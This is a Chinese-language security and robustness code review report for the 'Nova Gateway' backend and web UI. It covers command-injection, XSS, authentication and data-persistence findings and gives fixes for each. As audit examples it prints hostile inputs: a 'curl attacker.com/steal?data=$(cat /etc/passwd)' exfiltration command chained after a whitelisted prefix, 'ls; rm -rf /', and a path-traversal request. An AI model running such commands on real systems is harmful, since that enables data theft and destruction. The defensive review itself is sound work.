# 🛡️ 最终代码审查报告

## 📊 审查摘要
- **审查范围**: Nova Gateway 后端核心模块 + 前端 UI（static/）
- **问题统计**: 🔴 Critical: 5 | 🟠 High: 13 | 🟡 Medium: 12
- **总体结论**: 存在严重安全漏洞（含前端 XSS）和数据持久化风险，拒绝合并。必须先修复所有 Critical 和 High 问题后再考虑上线。

---

## 🔍 详细审阅意见

### 🔴 Critical (致命问题)

1. **无认证 API 暴露任意命令执行**
   - **位置**: `main.py:462-476` 及全部 API 端点
   - **风险维度**: 安全
   - **触发条件与后果**: 服务启动后，任何能访问 `127.0.0.1:8765` 的进程或用户均可调用所有 API，无需任何认证。攻击者可调用 `/api/review/run-tests`、`/api/tool-calls/retry` 等端点执行 shell 命令、读写工作区文件、修改运行时配置（含 API Key），实现完整的远程代码执行。
   - **修复方案**:
     ```python
     from fastapi import Depends, HTTPException, Security
     from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer

     _API_TOKEN = os.getenv("NOVA_API_TOKEN", "")
     _security = HTTPBearer(auto_error=False)

     async def require_auth(credentials: HTTPAuthorizationCredentials = Security(_security)):
         if not _API_TOKEN:
             return  # 开发环境未设置 token 时跳过
         if not credentials or credentials.credentials != _API_TOKEN:
             raise HTTPException(status_code=401, detail="Unauthorized")

     # 在路由上添加 dependencies=[Depends(require_auth)]
     @app.get("/api/health", dependencies=[Depends(require_auth)])
     async def health() -> Health:
         ...
     ```

2. **Shell 命令白名单绕过导致命令注入**
   - **位置**: `tools/workspace.py:947-976` (`_is_allowed_shell_command`)
   - **风险维度**: 安全
   - **触发条件与后果**: 白名单检查仅验证命令字符串的**前缀**是否匹配允许列表。攻击者可构造 `ls; rm -rf /`、`python -c "import os; os.system('malicious')"` 等复合命令绕过检查。`shell=True` 执行时 shell 元字符（`;`、`&&`、`||`、`` ` ``、`$()`）均会被解释，导致任意系统命令执行。
   - **修复方案**:
     ```python
     import re

     _SHELL_META_PATTERN = re.compile(r'[;|&`$(){}]')

     def _is_allowed_shell_command(self, command: str) -> bool:
         if _SHELL_META_PATTERN.search(command):
             return False
         try:
             tokens = shlex.split(command)
         except (IndexError, ValueError):
             return False
         if not tokens:
             return False
         first = tokens[0].lower()
         allowed_binaries = {"pwd", "ls", "find", "rg", "grep", "sed", "cat", "git", "python", "python3", "pytest", "node", "curl"}
         return first in allowed_binaries
     ```

3. **Review 测试命令注入绕过**
   - **位置**: `review/manager.py:208-217` (`_is_allowed_test_command`)
   - **风险维度**: 安全
   - **触发条件与后果**: 白名单允许 `for f in tests/frontend` 前缀。攻击者可提交命令 `for f in tests/frontend; do curl attacker.com/steal?data=$(cat /etc/passwd); done`，该命令以允许的前缀开头，但后续 shell 代码会被执行，通过 `/api/review/run-tests` 端点在服务器上执行任意命令。
   - **修复方案**:
     ```python
     def _is_allowed_test_command(self, command: str) -> bool:
         allowed_commands = {
             "PYTHONPATH=src python3 -m unittest discover -s tests",
             "python3 -m unittest discover -s tests",
             "python3 -m compileall -q src tests",
             "pytest",
         }
         return command in allowed_commands
     ```

4. **Hook 命令注入**
   - **位置**: `tools/hooks.py:113-132` (`_run_command_hook`)
   - **风险维度**: 安全
   - **触发条件与后果**: Hook 配置文件（`.nova/hooks.json`）中的 `command` 字段若为字符串，会以 `shell=True` 执行。若攻击者能写入该 JSON 文件（或通过 API 修改配置），可注入任意系统命令。配置中还可指定 `matcher: "*"` 匹配所有工具调用，实现持久化后门。
   - **修复方案**:
     ```python
     def _run_command_hook(self, command: Any, payload: dict[str, Any], timeout_ms: int) -> dict[str, Any]:
         try:
             if isinstance(command, list):
                 cmd = command
             else:
                 cmd = shlex.split(str(command))
             result = subprocess.run(
                 cmd,
                 cwd=self.cwd,
                 input=json.dumps(payload, ensure_ascii=False),
                 text=True,
                 capture_output=True,
                 timeout=max(0.1, min(timeout_ms / 1000, 30)),
                 shell=False,
             )
         except (OSError, subprocess.SubprocessError) as exc:
             return {"permission_decision": "deny", "reason": f"Hook 执行失败：{exc}"}
         # ... 后续逻辑不变
     ```

5. **会话存储文件写入非原子化，崩溃导致数据永久丢失**
   - **位置**: `sessions/store.py:49-63` (`_save`) 和 `sessions/store.py:65-88` (`_save_chats`)
   - **风险维度**: 鲁棒性
   - **触发条件与后果**: 进程在 `write_text` 执行过程中被 kill（OOM、断电、SIGKILL），或磁盘写满导致部分写入。JSON 文件被写成半截，下次启动时 `_load()` 中 `json.JSONDecodeError` 被静默捕获，所有会话历史和聊天记录被静默丢弃。
   - **修复方案**:
     ```python
     import tempfile
     import os

     def _atomic_write(path: Path, content: str, encoding: str = "utf-8") -> None:
         path.parent.mkdir(parents=True, exist_ok=True)
         fd, tmp_path = tempfile.mkstemp(dir=path.parent, suffix=".tmp")
         try:
             with os.fdopen(fd, "w", encoding=encoding) as f:
                 f.write(content)
                 f.flush()
                 os.fsync(f.fileno())
             os.replace(tmp_path, path)
         except BaseException:
             try:
                 os.unlink(tmp_path)
             except OSError:
                 pass
             raise
     ```

---

### 🟠 High (高危问题)

1. **流式对话 TOCTOU 竞态条件**
   - **位置**: `main.py:1130-1142` (`stream_chat_message`)
   - **风险维度**: 逻辑
   - **触发条件与后果**: 两个请求几乎同时对同一 `session_id` 发起 `stream_chat_message`，第一个请求通过 `is_active` 检查后、调用 `mark_active` 前，第二个请求也通过了 `is_active` 检查。同一 session 并发执行两个 agent turn，导致消息乱序、状态混乱。
   - **修复方案**:
     ```python
     # 将 is_active + mark_active 合并为原子操作
     if not agent_sessions.try_mark_active(session_id):
         queued = ChatMessage(
             session_id=session_id,
             role=ChatRole.USER,
             content=payload.content,
         )
         store.add_chat_message(queued)
         agent_sessions.enqueue_message(session_id, queued)
         return JSONResponse(
             status_code=202,
             content={"ok": True, "status": "queued", "message": queued.model_dump(mode="json")},
         )
     ```

2. **审批工具调用时硬编码 `workspace_write` 权限，绕过实际权限模式**
   - **位置**: `main.py:610-615` (`approve_tool_call`)
   - **风险维度**: 逻辑
   - **触发条件与后果**: 用户在 `ask` 模式下审批一个工具调用。审批通过后创建的 `WorkspaceTools` 使用 `permission_mode="workspace_write"` 而非当前实际权限模式，意味着审批后的工具调用获得了超出预期的权限。
   - **修复方案**:
     ```python
     tools = WorkspaceTools(
         workspace_manager.current_root,
         permission_mode=settings.permission_mode,
         sandbox_mode=settings.sandbox_mode,
         network_access=settings.network_access,
     )
     ```

3. **API Key 明文写入磁盘**
   - **位置**: `providers/bigmodel.py:76-82` (`_write_runtime_api_key`)
   - **风险维度**: 安全
   - **触发条件与后果**: 调用 `/api/runtime/secrets` 设置 API Key 时，密钥以 JSON 明文写入 `.nova/runtime-secrets.json`，无文件权限控制。同机其他用户或进程可直接读取明文 API Key。
   - **修复方案**:
     ```python
     import stat

     def _write_runtime_api_key(self, api_key_file: Path, api_key: str | None) -> None:
         api_key_file.parent.mkdir(parents=True, exist_ok=True)
         payload = {self.api_key_env: api_key} if api_key else {}
         api_key_file.write_text(
             json.dumps(payload, ensure_ascii=False, indent=2),
             encoding="utf-8",
         )
         api_key_file.chmod(stat.S_IRUSR | stat.S_IWUSR)  # 0600
     ```

4. **API Key 信息泄露**
   - **位置**: `main.py:262-271` (`/api/provider`)
   - **风险维度**: 安全
   - **触发条件与后果**: 任何用户访问 `/api/provider` 端点。响应中包含 `api_key_env`（环境变量名）、`api_key_source`（来源类型）等信息，降低攻击者获取密钥的难度。
   - **修复方案**:
     ```python
     @app.get("/api/provider")
     async def provider_status() -> dict:
         return {
             "provider": "bigmodel",
             "model": provider.model,
             "configured": provider.is_configured(),
         }
     ```

5. **worktree 名称路径遍历**
   - **位置**: `main.py:849-859` (`/api/worktrees/{name:path}`)
   - **风险维度**: 安全
   - **触发条件与后果**: FastAPI 的 `{name:path}` 路径参数会捕获包含 `/` 的路径段。攻击者可提交 `DELETE /api/worktrees/../../etc` 尝试路径遍历，可能删除工作区外的目录。
   - **修复方案**:
     ```python
     @app.delete("/api/worktrees/{name}")
     async def delete_worktree(name: str, discard: bool = Query(default=False)) -> dict:
         if ".." in name or "/" in name or "\\" in name:
             raise HTTPException(status_code=400, detail="无效的工作树名称")
         # ... 后续逻辑不变
     ```

6. **模型流式调用未关闭 HTTP 连接，长期运行导致连接泄漏**
   - **位置**: `providers/bigmodel.py:289-313` (`stream` 方法)
   - **风险维度**: 鲁棒性
   - **触发条件与后果**: 模型流式调用过程中抛出异常（网络中断、客户端取消），或正常迭代完成后 stream 对象未被显式关闭。底层 `httpx.AsyncClient` 连接未归还连接池，长期运行后连接数持续增长，最终触发连接上限。
   - **修复方案**:
     ```python
     async def stream(self, messages: list[ChatMessage]) -> AsyncIterator[str]:
         api_key = self._api_key()
         if not api_key:
             raise ProviderError(...)
         client = self._openai_client(api_key)
         try:
             response = await client.chat.completions.create(
                 model=self.model,
                 messages=self._payload_messages(messages),
                 temperature=0.3,
                 stream=True,
             )
         except Exception as exc:
             raise ProviderError(f"模型流式调用失败：{exc}") from exc
         try:
             async for chunk in response:
                 choices = self._read_attr(chunk, "choices") or []
                 if not choices:
                     continue
                 delta = self._read_attr(choices[0], "delta") or {}
                 content = self._stream_delta_text(delta)
                 if content:
                     yield content
         finally:
             await response.close()
     ```

7. **后台进程 drain 线程无异常保护，进程永远卡在 running 状态**
   - **位置**: `processes/manager.py:246-257` (`_drain_background`)
   - **风险维度**: 鲁棒性
   - **触发条件与后果**: `_append` 或 `_finish` 内部因锁竞争、内存不足等原因抛出未预期异常。daemon 线程静默死亡，`_drain_background` 不会调用 `_finish` 和 `_close_pipes`，进程状态永远停留在 `running`，资源永远不释放。
   - **修复方案**:
     ```python
     def _drain_background(self, job: ProcessJob, output_queue: queue.Queue[tuple[str, str | None]]) -> None:
         try:
             while job.process.poll() is None or not output_queue.empty():
                 try:
                     stream, chunk = output_queue.get(timeout=0.1)
                 except queue.Empty:
                     continue
                 if chunk:
                     self._append(job, stream, chunk)
         except Exception:
             pass
         finally:
             with self._lock:
                 terminal_status = job.status if job.status in {"killed", "cancelled", "timeout"} else None
             self._finish(job, terminal_status or ("completed" if job.process.returncode == 0 else "failed"))
             self._close_pipes(job)
     ```

8. **逐字符读取管道导致 I/O 性能极差**
   - **位置**: `processes/manager.py:232`
   - **风险维度**: 性能
   - **触发条件与后果**: `pipe.read(1)` 逐字节读取，每次系统调用只返回 1 字节，产生大量 syscall 开销。对于高输出命令，吞吐量可下降 100 倍以上。
   - **修复方案**:
     ```python
     def read(self) -> None:
         while True:
             chunk = pipe.read(self.chunk_size)
             if not chunk:
                 break
             output_queue.put((stream, chunk))
     ```

9. **每次消息写入都全量序列化并落盘整个聊天历史**
   - **位置**: `sessions/store.py:184-195` (`add_chat_message`)
   - **风险维度**: 性能
   - **触发条件与后果**: `_save_chats()` 将所有 session、所有 message、所有 event 序列化为 JSON 并写磁盘。随着会话增长，单次写入的序列化和 I/O 成本线性增加，长会话下可导致数百毫秒延迟。
   - **修复方案**: 仅追加新消息到文件，而非每次全量重写。

10. **XSS: 命令面板 command.name 和 command.description 未转义**
    - **位置**: `static/js/app.js:3571-3574` (`renderCommandPalette()`)
    - **风险维度**: 安全
    - **触发条件与后果**: `/api/commands` 接口返回的 `name` 或 `description` 包含恶意 HTML/JS（如 MITM 攻击、后端被注入）。攻击者可通过命令面板注入任意 HTML 和 JavaScript，窃取用户输入（包括 API Key）、劫持对话。
    - **修复方案**:
      ```javascript
      // 修复后
      item.innerHTML = `
        <strong>${escapeHtml(command.name)}${hint}</strong>
        <span>${escapeHtml(command.description)}</span>
      `;
      ```

11. **XSS: 运行模式 label 和 description 未转义**
    - **位置**: `static/js/app.js:628-631` (`renderWorkspace()`)
    - **风险维度**: 安全
    - **触发条件与后果**: `/api/workspace/status` 接口返回的 `modes[].label` 或 `modes[].description` 包含恶意 HTML/JS。左侧栏运行模式区域注入任意 HTML/JS，持续存在于页面生命周期内。
    - **修复方案**:
      ```javascript
      item.innerHTML = `
        <strong>${escapeHtml(mode.label)}</strong>
        <span>${escapeHtml(mode.description)}</span>
      `;
      ```

12. **XSS: 会话列表 session.title 未转义**
    - **位置**: `static/js/app.js:1822-1825` (`renderSessionItem()`)
    - **风险维度**: 安全
    - **触发条件与后果**: 用户创建包含 `<script>` 或事件处理器的会话标题，或 API 返回被篡改的会话数据。XSS 注入会持久存在于会话列表中，每次加载页面或切换会话时触发。
    - **修复方案**:
      ```javascript
      item.innerHTML = `
        <span class="session-main">
          <strong>${escapeHtml(shortText(session.title))}</strong>
          <small>${escapeHtml(shortText(workspaceDisplayName(session.workspace), 28))}</small>
          <span>${escapeHtml(formatTime(session.updated_at))}</span>
        </span>
        ...
      `;
      ```

13. **XSS: renderPermissions 的 value 未转义**
    - **位置**: `static/js/app.js:693` (`renderPermissions()`)
    - **风险维度**: 安全
    - **触发条件与后果**: 权限数据中 `approval_policy`、`permission_mode` 等字段包含恶意 HTML，在权限面板中注入 HTML/JS。
    - **修复方案**:
      ```javascript
      item.innerHTML = `<span>${escapeHtml(label)}</span><strong>${escapeHtml(String(value ?? "-"))}</strong>`;
      ```

---

### 🟡 Medium (中等隐患)

1. **配置接口 ValueError 未捕获**
   - **位置**: `main.py:221-222` (`_normalize_runtime_config`)
   - **风险维度**: 逻辑
   - **触发条件与后果**: 用户通过 `/api/runtime/config` PATCH 接口提交 `max_tool_rounds` 或 `context_window_tokens` 为非数字字符串（如 `"abc"`）。`int("abc")` 抛出 `ValueError`，导致 500 Internal Server Error。
   - **修复方案**:
     ```python
     try:
         config["max_tool_rounds"] = max(1, min(int(config["max_tool_rounds"]), 12))
     except (TypeError, ValueError):
         config["max_tool_rounds"] = _RUNTIME_BASE_CONFIG["max_tool_rounds"]
     ```

2. **Windows os.execv 行为异常及重启竞态**
   - **位置**: `main.py:315-322` (`restart_runtime`)
   - **风险维度**: 逻辑/鲁棒性
   - **触发条件与后果**: Windows 上 `os.execv` 不替换进程而是 spawn 新进程但不正确释放原进程资源，可能导致端口占用、僵尸进程。同时，`os.execv` 替换当前进程映像，0.35 秒延迟期间如果有正在进行的请求，HTTP 连接会被强制断开。
   - **修复方案**: 先检查活跃会话，Windows 上使用 `sys.exit(0)` + 进程管理器重启。

3. **子 Agent asyncio.run() 嵌套崩溃**
   - **位置**: `main.py:161` (`_subagent_runner`)
   - **风险维度**: 逻辑
   - **触发条件与后果**: `subagent_manager.default_runner` 从一个已有事件循环的同步上下文中被调用时，`asyncio.run()` 在已有运行中的事件循环时抛出 `RuntimeError`，子 Agent 完全无法执行。
   - **修复方案**:
     ```python
     try:
         loop = asyncio.get_running_loop()
     except RuntimeError:
         loop = None

     if loop and loop.is_running():
         import concurrent.futures
         with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
             return pool.submit(lambda: asyncio.run(asyncio.wait_for(collect(), timeout=20.0))).result()
     else:
         return asyncio.run(asyncio.wait_for(collect(), timeout=20.0))
     ```

4. **web_fetch / web_search 网络异常未捕获**
   - **位置**: `tools/workspace.py:793-810` 和 `tools/workspace.py:812-830`
   - **风险维度**: 鲁棒性
   - **触发条件与后果**: DNS 解析失败、连接超时、SSL 错误等网络异常未被 `ToolExecutionError` 捕获，直接抛出为未处理异常，用户看到"运行时异常"而非有意义的错误提示。
   - **修复方案**:
     ```python
     try:
         with urllib.request.urlopen(request, timeout=10) as response:
             content = response.read(max_bytes).decode("utf-8", errors="replace")
             status = getattr(response, "status", 200)
     except (urllib.error.URLError, OSError, TimeoutError) as exc:
         raise ToolExecutionError(f"网络请求失败：{exc}") from exc
     ```

5. **search_text 未处理 ripgrep 缺失和命令超时**
   - **位置**: `tools/workspace.py:484-521` (`search_text`)
   - **风险维度**: 鲁棒性
   - **触发条件与后果**: 系统未安装 `rg`（ripgrep），或搜索目录极大导致 10 秒超时。`FileNotFoundError` 和 `subprocess.TimeoutExpired` 未被捕获，直接抛出为未处理异常。
   - **修复方案**:
     ```python
     try:
         result = subprocess.run(
             command, cwd=self.project_root, text=True,
             capture_output=True, timeout=10,
         )
     except FileNotFoundError:
         raise ToolExecutionError("ripgrep (rg) 未安装，无法执行搜索。请安装 ripgrep 后重试。")
     except subprocess.TimeoutExpired:
         raise ToolExecutionError(f"搜索超时（10 秒），请缩小搜索范围或指定更精确的路径。")
     ```

6. **multi_edit 部分失败时文件处于不一致状态，无回滚机制**
   - **位置**: `tools/workspace.py:591-626` (`multi_edit`)
   - **风险维度**: 鲁棒性
   - **触发条件与后果**: edits 数组中第 N 个替换成功但第 N+1 个失败时，`after` 变量已包含前 N 次替换的结果，但文件尚未写入磁盘。用户收到的错误消息中 `after` 的状态不可预期。
   - **修复方案**: 写入前备份原始内容，失败时回滚。

7. **_terminate 静默吞噬所有异常，僵尸进程无法感知**
   - **位置**: `processes/manager.py:278-295` (`_terminate`)
   - **风险维度**: 鲁棒性
   - **触发条件与后果**: 进程已退出但 PID 被复用、权限不足、进程组不存在时，所有异常被 `except Exception: pass` 静默吞掉，调用方无法感知终止失败。
   - **修复方案**: 记录异常日志，对可恢复异常做区分处理。

8. **会话加载静默吞噬 JSON 解析错误，数据丢失无告警**
   - **位置**: `sessions/store.py:26-47` (`_load`)
   - **风险维度**: 鲁棒性
   - **触发条件与后果**: `sessions.json` 或 `chats.json` 文件被手动编辑导致 JSON 格式错误，或磁盘错误导致文件内容损坏。`json.JSONDecodeError` 被捕获后返回空字典，所有已有任务和聊天记录被静默丢弃。
   - **修复方案**: 解析失败时保留损坏文件备份并记录错误。

9. **每次工具执行都重建完整工具规格字典**
   - **位置**: `tools/executor.py:659-660` (`_tool_spec_data`)
   - **风险维度**: 性能
   - **触发条件与后果**: `_tool_spec_data` 内部调用 `self.tools.list_specs()`，该方法遍历所有 `TOOL_SPECS` 并且每次创建新的 `McpManager` 实例读取 MCP 配置。一次工具执行会产生 2 次调用（start + done）。
   - **修复方案**: 在 `ToolExecutor.__init__` 中缓存 specs 字典。

10. **BigModelProvider 每次 API 调用都创建新的 OpenAI 客户端**
    - **位置**: `providers/bigmodel.py:94-101` (`_openai_client`)
    - **风险维度**: 性能
    - **触发条件与后果**: 每次创建 `AsyncOpenAI` 实例会新建 HTTP 连接池，无法复用 TCP 连接。在多轮工具调用中，每轮至少调用一次模型 API，每次都重新建立连接。
    - **修复方案**: 缓存客户端实例。

11. **escapeHtml 在 <pre> 中产生双重换行**
    - **位置**: `static/js/app.js:2495-2500` (`escapeHtml()`)
    - **风险维度**: 逻辑
    - **触发条件与后果**: 任何在 `<pre>` 元素中使用 `escapeHtml()` 的位置，换行符被渲染为 `<br>`，而 `<pre>` 本身已保留换行，导致每行之间多出一个空行，破坏代码和日志的格式化显示。
    - **修复方案**:
      ```javascript
      export function escapeHtml(value) {
        const div = document.createElement("div");
        div.textContent = value;
        return div.innerHTML;
      }

      // 在需要可视换行的非 <pre> 场景单独处理
      function escapeHtmlWithBreaks(value) {
        const div = document.createElement("div");
        div.textContent = value;
        return div.innerHTML.replaceAll("\n", "<br>");
      }
      ```

12. **流式 JSON 解析静默吞错**
    - **位置**: `static/js/runtime/stream.js:13-17`
    - **风险维度**: 鲁棒性
    - **触发条件与后果**: 服务端返回的 SSE 行不是合法 JSON（如服务端错误页面、网络中间层注入的 HTML 错误页）。非 JSON 行被静默忽略，用户不会收到任何错误反馈。
    - **修复方案**:
      ```javascript
      let parseErrors = 0;
      for (const line of lines) {
        if (!line.trim()) continue;
        let event;
        try {
          event = JSON.parse(line);
        } catch {
          parseErrors++;
          continue;
        }
        // ... existing event handling
      }
      if (parseErrors > 0 && ok) {
        console.warn(`[stream] ${parseErrors} non-JSON lines skipped`);
      }
      ```

---

## ✅ 审查通过项

- **上下文预算管理**: `context_budget.py` 实现了合理的 token 估算和自动压缩机制，有效防止上下文溢出。
- **工具权限控制**: `workspace.py` 中的权限检查逻辑覆盖了多种权限模式（read_only, ask, workspace_write, plan, bypass_permissions 等），设计合理。
- **Hook 生命周期**: `hooks.py` 实现了完整的 PreToolUse/PostToolUse/PermissionRequest 生命周期，支持声明式和命令式 hook。
- **进程管理**: `processes/manager.py` 实现了前台/后台进程管理、超时控制、取消机制，设计较为完善。
- **记忆系统**: `memory/project.py` 实现了项目记忆、人格文件、候选记忆等机制，支持长期记忆管理。

---

## 📝 审查结论

**核心风险**: 项目存在 5 个 Critical 级别问题，其中 4 个是安全漏洞（无认证 API、命令注入、Hook 注入），1 个是数据持久化风险（非原子写入）。此外，前端存在 4 个 High 级别 XSS 漏洞，攻击者可通过篡改 API 响应注入恶意脚本，窃取用户 API Key 或劫持会话。

**建议优先级**:
1. **立即修复**: 所有 Critical 安全问题（#1-#4），特别是无认证 API 和命令注入
2. **尽快修复**: 数据持久化问题（#5）、前端 XSS 漏洞（#10-#13）和 High 级别的安全/稳定性问题
3. **排期修复**: Medium 级别问题，可在后续版本中逐步解决

**拒绝合并**: 在所有 Critical 和 High 问题修复之前，拒绝合并到主分支。
